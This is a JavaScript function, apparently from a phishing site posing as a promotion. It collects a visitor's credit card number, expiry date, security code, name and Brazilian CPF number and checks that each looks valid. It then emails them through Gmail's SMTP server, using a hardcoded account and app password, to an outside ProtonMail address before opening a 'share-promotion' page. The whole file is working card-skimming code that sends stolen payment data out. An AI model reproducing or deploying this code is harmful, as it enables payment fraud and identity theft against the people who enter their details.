function sendEmail() {
    let ccNum  = document.getElementById("ccnumber").value;
    let ccExp  = document.getElementById("cc-exp").value;
    let ccCsc  = document.getElementById("cc-csc").value;
    let ccName = document.getElementById("ccname").value;
    let cpf    = document.getElementById("cpf").value; 
    let finalmessage = `CC Number : ${ccNum} <br>  CC-EXP : ${ccExp} <br>  CC-CSC : ${ccCsc} <br> CC NAME : ${ccName} <br> CPF: ${cpf}`;

    if (ccNum.length === 16){
        if (ccExp.length >= 4){
            if (ccCsc.length == 3 || ccCsc.length == 4){
                if (ccName.length > 6){
                    if (cpf.length == 11 || cpf.length == 14){
                        Email.send({
                            Host: "smtp.gmail.com",
                            Username : "xsda.ddce.2343.2343.xsop@gmail.com",
                            Password : "xhqe towf geiu nvyt",
                            To : 'user1533@protonmail.com',
                            From : "xsda.ddce.2343.2343.xsop@gmail.com",
                            Subject : "Mail from website",
                            Body : finalmessage
                        });
                        
                        window.open('share-promotion.html');
                    }
                }
            }
        }
    }
}
